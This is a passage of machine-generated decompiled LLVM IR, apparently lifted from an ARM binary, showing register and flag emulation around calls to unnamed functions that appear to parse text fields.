  %v5_9c6c = icmp slt i32 %v4_9c6c, 0
  store i1 %v5_9c6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9c6c = icmp slt i32 %v1_9c6c, 0
  store i1 %v6_9c6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9c6c = icmp eq i32 %v1_9c6c, 0
  store i1 %v7_9c6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9c68, i32* %r2.global-to-local, align 4
  br i1 %v7_9c6c, label %.thread45, label %dec_label_pc_9c78

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c18
  store i32 %v2_9a54, i32* %ip.global-to-local, align 4
  %v1_9c80 = load i32, i32* @r4, align 4
  %v2_9c80 = add i32 %v1_9c80, %v2_9a54
  %v1_9c84 = add i32 %v5_9c68, -1
  %v2_9c84 = icmp ne i32 %v5_9c68, 0
  store i1 %v2_9c84, i1* %cpsr_c.global-to-local, align 1
  %v3_9c84 = sub i32 0, %v5_9c68
  %v4_9c84 = and i32 %v5_9c68, %v3_9c84
  %v5_9c84 = icmp slt i32 %v4_9c84, 0
  store i1 %v5_9c84, i1* %cpsr_v.global-to-local, align 1
  %v6_9c84 = icmp slt i32 %v1_9c84, 0
  store i1 %v6_9c84, i1* %cpsr_n.global-to-local, align 1
  %v7_9c84 = icmp eq i32 %v5_9c68, 1
  store i1 %v7_9c84, i1* %cpsr_z.global-to-local, align 1
  %v1_9c88 = add i32 %v2_9c80, -20736
  store i32 %v1_9c88, i32* %r3.global-to-local, align 4
  %v7_9c8c = icmp sgt i32 %v5_9c68, 1
  br i1 %v7_9c8c, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_9c78
  %v9_9c8c = add i32 %v5_9c68, -2
  store i32 %v9_9c8c, i32* %r2.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_9c78, %bb211
  %v3_9c94 = phi i32 [ %v5_9c68, %dec_label_pc_9c78 ], [ %v9_9c8c, %bb211 ]
  %v1_9c90 = add i32 %v2_9c80, -20773
  store i32 %v1_9c90, i32* %r3.global-to-local, align 4
  %v0_9c94 = load i32, i32* @r5, align 4
  %v1_9c94 = trunc i32 %v0_9c94 to i8
  %v4_9c94 = add i32 %v3_9c94, %v1_9c90
  %v5_9c94 = inttoptr i32 %v4_9c94 to i8*
  store i8 %v1_9c94, i8* %v5_9c94, align 1
  %v0_9c98 = load i32, i32* @r6, align 4
  store i32 %v0_9c98, i32* %r0.global-to-local, align 4
  %v1_9c9c = inttoptr i32 %v0_9c98 to i8*
  %v2_9c9c = call i32 @function_13a08(i8* %v1_9c9c)
  %v0_9ca0 = load i32, i32* @r5, align 4
  store i32 %v0_9ca0, i32* %r1.global-to-local, align 4
  store i32 %v2_9c9c, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_9cac = inttoptr i32 %v0_9ca0 to i32*
  %v3_9cac = call i32 @function_13000(i32 43, i32* %v2_9cac)
  %v0_9cb0 = load i32, i32* @r4, align 4
  store i32 %v0_9cb0, i32* @r1, align 4
  store i32 %v3_9cac, i32* %r2.global-to-local, align 4
  %v0_9cb8 = load i32, i32* @r6, align 4
  store i32 %v0_9cb8, i32* %r0.global-to-local, align 4
  %v3_9cbc = inttoptr i32 %v0_9cb8 to i8*
  %v4_9cbc = call i32 @function_13d5c(i8* %v3_9cbc, i32 %v0_9cb0, i32 %v3_9cac)
  store i32 %v4_9cbc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9cc0 = icmp slt i32 %v4_9cbc, 0
  store i1 %v1_9cc0, i1* %cpsr_n.global-to-local, align 1
  %v2_9cc0 = icmp eq i32 %v4_9cbc, 0
  store i1 %v2_9cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9cc0, label %.thread45, label %bb213

bb213:                                            ; preds = %bb212
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9cc8 = load i32, i32* @r8, align 4
  %v3_9cc8 = inttoptr i32 %v2_9cc8 to i32*
  store i32 1, i32* %v3_9cc8, align 4
  br label %.thread45

.thread45:                                        ; preds = %bb212, %dec_label_pc_9c18, %.thread44, %bb213
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_9cd8 = load i32, i32* @r8, align 4
  %v2_9cd8 = add i32 %v1_9cd8, 4
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i32*
  store i32 0, i32* %v3_9cd8, align 4
  %v3_9cdc = call i32 @function_13000(i32 41, i32* null)
  %v0_9ce0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ce0, i32* @r1, align 4
  store i32 %v3_9cdc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9cec = call i32 @function_13d5c(i8* %tmp197, i32 %v0_9ce0, i32 %v3_9cdc)
  store i32 %v4_9cec, i32* %r0.global-to-local, align 4
  %v1_9cf4 = add i32 %v4_9cec, 1
  %v2_9cf4 = icmp eq i32 %v4_9cec, -1
  store i1 %v2_9cf4, i1* %cpsr_c.global-to-local, align 1
  %v3_9cf4 = sub i32 0, %v4_9cec
  %v4_9cf4 = and i32 %v1_9cf4, %v3_9cf4
  %v5_9cf4 = icmp slt i32 %v4_9cf4, 0
  store i1 %v5_9cf4, i1* %cpsr_v.global-to-local, align 1
  %v6_9cf4 = icmp slt i32 %v1_9cf4, 0
  store i1 %v6_9cf4, i1* %cpsr_n.global-to-local, align 1
  %v7_9cf4 = icmp eq i32 %v1_9cf4, 0
  store i1 %v7_9cf4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_9cf4, label %.thread46, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %.thread45
  %v0_9d00 = load i32, i32* @r6, align 4
  store i32 %v0_9d00, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_9d08 = inttoptr i32 %v0_9d00 to i32*
  %v3_9d08 = call i32 @function_13000(i32 41, i32* %v2_9d08)
  %v0_9d0c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9d0c, i32* @r1, align 4
  store i32 %v3_9d08, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9d18 = call i32 @function_13d5c(i8* %tmp197, i32 %v0_9d0c, i32 %v3_9d08)
  store i32 %v4_9d18, i32* %r0.global-to-local, align 4
  store i32 %v2_9a54, i32* %lr.global-to-local, align 4
  %v2_9d24 = add i32 %v4_9d18, %v2_9a54
  store i32 %v2_9d24, i32* %r3.global-to-local, align 4
  %v1_9d28 = load i32, i32* @r5, align 4
  %v2_9d28 = add i32 %v1_9d28, %v2_9d24
  %v3_9d28 = inttoptr i32 %v2_9d28 to i8*
  %v4_9d28 = load i8, i8* %v3_9d28, align 1
  %v2_9d30 = icmp ugt i8 %v4_9d28, 31
  store i1 %v2_9d30, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9d30 = icmp ult i8 %v4_9d28, 32
  store i1 %v6_9d30, i1* %cpsr_n.global-to-local, align 1
  %v7_9d30 = icmp eq i8 %v4_9d28, 32
  store i1 %v7_9d30, i1* %cpsr_z.global-to-local, align 1
  %v2_9d38 = zext i1 %v7_9d30 to i32
  %v2_9d38.v4_9d18 = add i32 %v2_9d38, %v4_9d18
  store i32 %v2_9d38.v4_9d18, i32* @r4, align 4
  %v2_9d3c = add i32 %v2_9d38.v4_9d18, %v2_8fd8
  store i32 %v2_9d3c, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9d3c, i32* %r0.global-to-local, align 4
  %v1_9d48 = load i32, i32* %fp.global-to-local, align 4
  %v2_9d48 = sub i32 %v1_9d48, %v2_9d38.v4_9d18
  store i32 %v2_9d48, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9d50 = call i32 @function_13acc(i32 %v2_9d3c, i32 %v2_9d48, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32 2)
  store i32 %v5_9d50, i32* %r0.global-to-local, align 4
  %v1_9d54 = add i32 %v5_9d50, 1
  %v2_9d54 = icmp eq i32 %v5_9d50, -1
  store i1 %v2_9d54, i1* %cpsr_c.global-to-local, align 1
  %v3_9d54 = sub i32 0, %v5_9d50
  %v4_9d54 = and i32 %v1_9d54, %v3_9d54
  %v5_9d54 = icmp slt i32 %v4_9d54, 0
  store i1 %v5_9d54, i1* %cpsr_v.global-to-local, align 1
  %v6_9d54 = icmp slt i32 %v1_9d54, 0
  store i1 %v6_9d54, i1* %cpsr_n.global-to-local, align 1
  %v7_9d54 = icmp eq i32 %v1_9d54, 0
  store i1 %v7_9d54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9d50, i32* %r2.global-to-local, align 4
  br i1 %v7_9d54, label %.thread46, label %dec_label_pc_9d60

dec_label_pc_9d60:                                ; preds = %dec_label_pc_9d00
  store i32 %v2_9a54, i32* %ip.global-to-local, align 4
  %v1_9d68 = load i32, i32* @r4, align 4
  %v2_9d68 = add i32 %v1_9d68, %v2_9a54
  %v1_9d6c = add i32 %v5_9d50, -1
  %v2_9d6c = icmp ne i32 %v5_9d50, 0
  store i1 %v2_9d6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9d6c = sub i32 0, %v5_9d50
  %v4_9d6c = and i32 %v5_9d50, %v3_9d6c
  %v5_9d6c = icmp slt i32 %v4_9d6c, 0
  store i1 %v5_9d6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9d6c = icmp slt i32 %v1_9d6c, 0
  store i1 %v6_9d6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9d6c = icmp eq i32 %v5_9d50, 1
  store i1 %v7_9d6c, i1* %cpsr_z.global-to-local, align 1
  %v1_9d70 = add i32 %v2_9d68, -20736
  store i32 %v1_9d70, i32* %r3.global-to-local, align 4
  %v7_9d74 = icmp sgt i32 %v5_9d50, 1
  br i1 %v7_9d74, label %bb214, label %bb215

bb214:                                            ; preds = %dec_label_pc_9d60
  %v9_9d74 = add i32 %v5_9d50, -2
  store i32 %v9_9d74, i32* %r2.global-to-local, align 4
  br label %bb215

bb215:                                            ; preds = %dec_label_pc_9d60, %bb214
  %v3_9d7c = phi i32 [ %v5_9d50, %dec_label_pc_9d60 ], [ %v9_9d74, %bb214 ]
  %v1_9d78 = add i32 %v2_9d68, -20773
  store i32 %v1_9d78, i32* %r3.global-to-local, align 4
  %v0_9d7c = load i32, i32* @r6, align 4
  %v1_9d7c = trunc i32 %v0_9d7c to i8
  %v4_9d7c = add i32 %v3_9d7c, %v1_9d78
  %v5_9d7c = inttoptr i32 %v4_9d7c to i8*
  store i8 %v1_9d7c, i8* %v5_9d7c, align 1
  %v0_9d80 = load i32, i32* @r5, align 4
  store i32 %v0_9d80, i32* %r0.global-to-local, align 4
  %v1_9d84 = inttoptr i32 %v0_9d80 to i8*
  %v2_9d84 = call i32 @function_13a08(i8* %v1_9d84)
  %v0_9d88 = load i32, i32* @r6, align 4
  store i32 %v0_9d88, i32* %r1.global-to-local, align 4
  store i32 %v2_9d84, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_9d94 = inttoptr i32 %v0_9d88 to i32*
  %v3_9d94 = call i32 @function_13000(i32 42, i32* %v2_9d94)
  %v0_9d98 = load i32, i32* @r4, align 4
  store i32 %v0_9d98, i32* @r1, align 4
  store i32 %v3_9d94, i32* %r2.global-to-local, align 4
  %v0_9da0 = load i32, i32* @r5, align 4
  store i32 %v0_9da0, i32* %r0.global-to-local, align 4
  %v3_9da4 = inttoptr i32 %v0_9da0 to i8*
  %v4_9da4 = call i32 @function_13d5c(i8* %v3_9da4, i32 %v0_9d98, i32 %v3_9d94)
  store i32 %v4_9da4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9da8 = icmp slt i32 %v4_9da4, 0
  store i1 %v1_9da8, i1* %cpsr_n.global-to-local, align 1
  %v2_9da8 = icmp eq i32 %v4_9da4, 0
  store i1 %v2_9da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9da8, label %.thread46, label %bb216

bb216:                                            ; preds = %bb215
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9db0 = load i32, i32* @r8, align 4
  %v3_9db0 = add i32 %v2_9db0, 4
  %v4_9db0 = inttoptr i32 %v3_9db0 to i32*
  store i32 1, i32* %v4_9db0, align 4
  br label %.thread46

.thread46:                                        ; preds = %bb215, %dec_label_pc_9d00, %.thread45, %bb216
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9dbc = call i32 @function_13000(i32 40, i32* null)
  %v0_9dc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9dc0, i32* @r1, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9dcc = call i32 @function_13d5c(i8* %tmp197, i32 %v0_9dc0, i32 %v3_9dbc)
  store i32 %v4_9dcc, i32* %r0.global-to-local, align 4
  %v1_9dd0 = add i32 %v4_9dcc, 1
  %v2_9dd0 = icmp eq i32 %v4_9dcc, -1
  store i1 %v2_9dd0, i1* %cpsr_c.global-to-local, align 1
  %v3_9dd0 = sub i32 0, %v4_9dcc
  %v4_9dd0 = and i32 %v1_9dd0, %v3_9dd0
  %v5_9dd0 = icmp slt i32 %v4_9dd0, 0
  store i1 %v5_9dd0, i1* %cpsr_v.global-to-local, align 1
  %v6_9dd0 = icmp slt i32 %v1_9dd0, 0
  store i1 %v6_9dd0, i1* %cpsr_n.global-to-local, align 1
  %v7_9dd0 = icmp eq i32 %v1_9dd0, 0
  store i1 %v7_9dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20737, i32* %r5.global-to-local, align 4
  br i1 %v7_9dd0, label %.thread, label %dec_label_pc_9de8

.thread:                                          ; preds = %.thread46
  store i32 -20773, i32* %r5.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r8, align 4
  %v3_9de0 = add i32 %v2_9de0, 8
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 0, i32* %v4_9de0, align 4
  br label %dec_label_pc_9e7c

dec_label_pc_9de8:                                ; preds = %.thread46
  store i32 -20773, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9df0 = call i32 @function_13000(i32 40, i32* null)
  %v0_9df4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9df4, i32* @r1, align 4
  store i32 %v3_9df0, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9e00 = call i32 @function_13d5c(i8* %tmp197, i32 %v0_9df4, i32 %v3_9df0)
  store i32 %v4_9e00, i32* %r0.global-to-local, align 4
  store i32 %v2_9a54, i32* %lr.global-to-local, align 4
  %v2_9e0c = add i32 %v4_9e00, %v2_9a54
  store i32 %v2_9e0c, i32* %r3.global-to-local, align 4
  %v1_9e10 = load i32, i32* @r5, align 4
  %v2_9e10 = add i32 %v1_9e10, %v2_9e0c
  %v3_9e10 = inttoptr i32 %v2_9e10 to i8*
  %v4_9e10 = load i8, i8* %v3_9e10, align 1
  %v2_9e18 = icmp ugt i8 %v4_9e10, 31
  store i1 %v2_9e18, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9e18 = icmp ult i8 %v4_9e10, 32
  store i1 %v6_9e18, i1* %cpsr_n.global-to-local, align 1
  %v7_9e18 = icmp eq i8 %v4_9e10, 32
  store i1 %v7_9e18, i1* %cpsr_z.global-to-local, align 1
  %v2_9e20 = zext i1 %v7_9e18 to i32
  %v2_9e20.v4_9e00 = add i32 %v2_9e20, %v4_9e00
  store i32 %v2_9e20.v4_9e00, i32* @r4, align 4
  %v2_9e24 = add i32 %v2_9e20.v4_9e00, %v2_8fd8
  store i32 %v2_9e24, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9e24, i32* %r0.global-to-local, align 4
  %v1_9e30 = load i32, i32* %fp.global-to-local, align 4
  %v2_9e30 = sub i32 %v1_9e30, %v2_9e20.v4_9e00
  store i32 %v2_9e30, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9e38 = call i32 @function_13acc(i32 %v2_9e24, i32 %v2_9e30, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32 2)
  store i32 %v5_9e38, i32* %r0.global-to-local, align 4
  %v1_9e3c = add i32 %v5_9e38, 1
  %v2_9e3c = icmp eq i32 %v5_9e38, -1
  store i1 %v2_9e3c, i1* %cpsr_c.global-to-local, align 1
  %v3_9e3c = sub i32 0, %v5_9e38
  %v4_9e3c = and i32 %v1_9e3c, %v3_9e3c
  %v5_9e3c = icmp slt i32 %v4_9e3c, 0
  store i1 %v5_9e3c, i1* %cpsr_v.global-to-local, align 1
  %v6_9e3c = icmp slt i32 %v1_9e3c, 0
  store i1 %v6_9e3c, i1* %cpsr_n.global-to-local, align 1
  %v7_9e3c = icmp eq i32 %v1_9e3c, 0
  store i1 %v7_9e3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9e38, i32* %r2.global-to-local, align 4
  br i1 %v7_9e3c, label %dec_label_pc_9e7c, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9de8
  store i32 %v2_9a54, i32* %ip.global-to-local, align 4
  %v1_9e50 = load i32, i32* @r4, align 4
  %v2_9e50 = add i32 %v1_9e50, %v2_9a54
  %v1_9e54 = add i32 %v5_9e38, -1
  %v2_9e54 = icmp ne i32 %v5_9e38, 0
  store i1 %v2_9e54, i1* %cpsr_c.global-to-local, align 1
  %v3_9e54 = sub i32 0, %v5_9e38
  %v4_9e54 = and i32 %v5_9e38, %v3_9e54
  %v5_9e54 = icmp slt i32 %v4_9e54, 0
  store i1 %v5_9e54, i1* %cpsr_v.global-to-local, align 1
  %v6_9e54 = icmp slt i32 %v1_9e54, 0
  store i1 %v6_9e54, i1* %cpsr_n.global-to-local, align 1
  %v7_9e54 = icmp eq i32 %v5_9e38, 1
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v2_9e50, -20736
  store i32 %v1_9e58, i32* %r3.global-to-local, align 4
  %v7_9e5c = icmp sgt i32 %v5_9e38, 1
  br i1 %v7_9e5c, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_9e48
  %v9_9e5c = add i32 %v5_9e38, -2
  store i32 %v9_9e5c, i32* %r2.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_9e48, %bb217
  %v3_9e70 = phi i32 [ %v5_9e38, %dec_label_pc_9e48 ], [ %v9_9e5c, %bb217 ]
  %v1_9e60 = add i32 %v2_9e50, -20773
  store i32 %v1_9e60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_9e68 = load i32, i32* @r5, align 4
  store i32 %v0_9e68, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_9e70 = add i32 %v3_9e70, %v1_9e60
  %v5_9e70 = inttoptr i32 %v4_9e70 to i8*
  store i8 0, i8* %v5_9e70, align 1
  %v2_9e74 = inttoptr i32 %v0_9e68 to i8*
  %v3_9e74 = call i32 @function_13b34(i8* %v2_9e74, i32 10)
  store i32 %v3_9e74, i32* %r0.global-to-local, align 4
  %v1_9e78 = load i32, i32* @r8, align 4
  %v2_9e78 = add i32 %v1_9e78, 8
  %v3_9e78 = inttoptr i32 %v2_9e78 to i32*
  store i32 %v3_9e74, i32* %v3_9e78, align 4
  br label %dec_label_pc_9e7c

dec_label_pc_9e7c:                                ; preds = %.thread, %dec_label_pc_9de8, %bb218
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_a054, %dec_label_pc_9fd4, %dec_label_pc_9e7c
  %v1_9e8c = phi i32 [ 0, %dec_label_pc_9e7c ], [ %v0_9fd4, %dec_label_pc_9fd4 ], [ %v1_9e8c.pre.pre, %dec_label_pc_a054 ]
  %stack_var_-40.11 = phi i32 [ %stack_var_-40.7, %dec_label_pc_9e7c ], [ %stack_var_-40.12, %dec_label_pc_9fd4 ], [ %stack_var_-40.14, %dec_label_pc_a054 ]
  store i32 %v2_8fd8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9e8c = add i32 %v1_9e8c, %v2_8fd8
  store i32 %v2_9e8c, i32* @r4, align 4
  %v3_9e90 = call i32 @function_13000(i32 39, i32* null)
  %v0_9e94 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9e94, i32* @r1, align 4
  store i32 %v3_9e90, i32* %r2.global-to-local, align 4
  %v0_9e9c = load i32, i32* @r4, align 4
  store i32 %v0_9e9c, i32* %r0.global-to-local, align 4
  %v3_9ea0 = inttoptr i32 %v0_9e9c to i8*
  %v4_9ea0 = call i32 @function_13d5c(i8* %v3_9ea0, i32 %v0_9e94, i32 %v3_9e90)
  store i32 %v4_9ea0, i32* %r0.global-to-local, align 4
  %v1_9ea8 = add i32 %v4_9ea0, 1
  %v2_9ea8 = icmp eq i32 %v4_9ea0, -1
  store i1 %v2_9ea8, i1* %cpsr_c.global-to-local, align 1
  %v3_9ea8 = sub i32 0, %v4_9ea0
  %v4_9ea8 = and i32 %v1_9ea8, %v3_9ea8
  %v5_9ea8 = icmp slt i32 %v4_9ea8, 0
  store i1 %v5_9ea8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ea8 = icmp slt i32 %v1_9ea8, 0
  store i1 %v6_9ea8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ea8 = icmp eq i32 %v1_9ea8, 0
  store i1 %v7_9ea8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9ea8, label %dec_label_pc_a080, label %dec_label_pc_9eb4

dec_label_pc_9eb4:                                ; preds = %dec_label_pc_9e80
  %v0_9eb4 = load i32, i32* @r8, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 12
  %v2_9eb4 = inttoptr i32 %v1_9eb4 to i32*
  %v3_9eb4 = load i32, i32* %v2_9eb4, align 4
  store i32 %v3_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = add i32 %v3_9eb4, -4
  %v2_9eb8 = icmp ugt i32 %v3_9eb4, 3
  store i1 %v2_9eb8, i1* %cpsr_c.global-to-local, align 1
  %v3_9eb8 = sub i32 3, %v3_9eb4
  %v4_9eb8 = and i32 %v3_9eb8, %v3_9eb4
  %v5_9eb8 = icmp slt i32 %v4_9eb8, 0
  store i1 %v5_9eb8, i1* %cpsr_v.global-to-local, align 1
  %v6_9eb8 = icmp slt i32 %v1_9eb8, 0
  store i1 %v6_9eb8, i1* %cpsr_n.global-to-local, align 1
  %v7_9eb8 = icmp eq i32 %v3_9eb4, 4
  store i1 %v7_9eb8, i1* %cpsr_z.global-to-local, align 1
  %v8_9ebc = icmp sgt i32 %v3_9eb4, 4
  br i1 %v8_9ebc, label %dec_label_pc_a080, label %dec_label_pc_9ec0

dec_label_pc_9ec0:                                ; preds = %dec_label_pc_9eb4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_9ec8 = call i32 @function_13000(i32 39, i32* null)
  %v0_9ecc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9ecc, i32* @r1, align 4
  store i32 %v3_9ec8, i32* %r2.global-to-local, align 4
  %v0_9ed4 = load i32, i32* @r4, align 4
  store i32 %v0_9ed4, i32* %r0.global-to-local, align 4
  %v3_9ed8 = inttoptr i32 %v0_9ed4 to i8*
  %v4_9ed8 = call i32 @function_13d5c(i8* %v3_9ed8, i32 %v0_9ecc, i32 %v3_9ec8)
  store i32 %v4_9ed8, i32* %r0.global-to-local, align 4
  %v0_9ee0 = load i32, i32* @r5, align 4
  %v2_9ee0 = add i32 %v0_9ee0, %v4_9ed8
  store i32 %v2_9ee0, i32* @sl, align 4
  store i32 %v2_9a54, i32* %r1.global-to-local, align 4
  %v2_9ee8 = add i32 %v2_9ee0, %v2_9a54
  store i32 %v2_9ee8, i32* %r3.global-to-local, align 4
  %v1_9eec = load i32, i32* @r6, align 4
  %v2_9eec = add i32 %v1_9eec, %v2_9ee8
  %v3_9eec = inttoptr i32 %v2_9eec to i8*
  %v4_9eec = load i8, i8* %v3_9eec, align 1
  %v6_9eec = zext i8 %v4_9eec to i32
  store i32 %v6_9eec, i32* %r2.global-to-local, align 4
  %v2_9ef0 = icmp ugt i8 %v4_9eec, 31
  store i1 %v2_9ef0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9ef0 = icmp ult i8 %v4_9eec, 32
  store i1 %v6_9ef0, i1* %cpsr_n.global-to-local, align 1
  %v7_9ef0 = icmp eq i8 %v4_9eec, 32
  store i1 %v7_9ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ef0, label %bb219, label %bb220

bb219:                                            ; preds = %dec_label_pc_9ec0
  %v2_9ef4 = add i32 %v4_9ed8, 1
  store i32 %v2_9ef4, i32* %r0.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_9ec0, %bb219
  %v2_9f04 = phi i32 [ %v4_9ed8, %dec_label_pc_9ec0 ], [ %v2_9ef4, %bb219 ]
  %v1_9ef8 = load i32, i32* %fp.global-to-local, align 4
  %v2_9ef8 = sub i32 %v1_9ef8, %v0_9ee0
  store i32 %v2_9ef8, i32* %r3.global-to-local, align 4
  %v2_9efc = sub i32 %v2_9ef8, %v2_9f04
  store i32 %v2_9efc, i32* @r7, align 4
  %v0_9f00 = load i32, i32* @r4, align 4
  %v2_9f00 = add i32 %v0_9f00, %v2_9f04
  store i32 %v2_9f00, i32* @r6, align 4
  br i1 %v7_9ef0, label %bb221, label %bb222

bb221:                                            ; preds = %bb220
  %v3_9f04 = add i32 %v2_9f04, %v0_9ee0
  store i32 %v3_9f04, i32* @sl, align 4
  br label %bb222

bb222:                                            ; preds = %bb220, %bb221
  store i32 %v2_9efc, i32* %r1.global-to-local, align 4
  store i32 %v2_9f00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9f18 = call i32 @function_13acc(i32 %v2_9f00, i32 %v2_9efc, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32 2)
  store i32 %v5_9f18, i32* %r0.global-to-local, align 4
  %v1_9f1c = add i32 %v5_9f18, 1
  %v2_9f1c = icmp eq i32 %v5_9f18, -1
  store i1 %v2_9f1c, i1* %cpsr_c.global-to-local, align 1
  %v3_9f1c = sub i32 0, %v5_9f18
  %v4_9f1c = and i32 %v1_9f1c, %v3_9f1c
  %v5_9f1c = icmp slt i32 %v4_9f1c, 0
  store i1 %v5_9f1c, i1* %cpsr_v.global-to-local, align 1
  %v6_9f1c = icmp slt i32 %v1_9f1c, 0
  store i1 %v6_9f1c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f1c = icmp eq i32 %v1_9f1c, 0
  store i1 %v7_9f1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9f18, i32* @r4, align 4
  br i1 %v7_9f1c, label %dec_label_pc_9fd4, label %dec_label_pc_9f28

dec_label_pc_9f28:                                ; preds = %bb222
  store i32 %v2_8fd8, i32* %r2.global-to-local, align 4
  %v1_9f2c = add i32 %v5_9f18, -1
  %v2_9f2c = icmp ne i32 %v5_9f18, 0
  store i1 %v2_9f2c, i1* %cpsr_c.global-to-local, align 1
  %v3_9f2c = sub i32 0, %v5_9f18
  %v4_9f2c = and i32 %v5_9f18, %v3_9f2c
  %v5_9f2c = icmp slt i32 %v4_9f2c, 0
  store i1 %v5_9f2c, i1* %cpsr_v.global-to-local, align 1
  %v6_9f2c = icmp slt i32 %v1_9f2c, 0
  store i1 %v6_9f2c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f2c = icmp eq i32 %v5_9f18, 1
  store i1 %v7_9f2c, i1* %cpsr_z.global-to-local, align 1
  %v7_9f30 = icmp slt i32 %v5_9f18, 2
  br i1 %v7_9f30, label %bb224, label %bb223

bb223:                                            ; preds = %dec_label_pc_9f28
  %v9_9f30 = add i32 %v5_9f18, -2
  store i32 %v9_9f30, i32* @r4, align 4
  br label %bb224

bb224:                                            ; preds = %dec_label_pc_9f28, %bb223
  %v1_9f34 = load i32, i32* @sl, align 4
  %v2_9f34 = add i32 %v1_9f34, %v2_8fd8
  store i32 %v2_9f34, i32* @r5, align 4
  %v0_9f38 = load i32, i32* @r6, align 4
  store i32 %v0_9f38, i32* %r0.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r7, align 4
  store i32 %v0_9f3c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14388.97 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
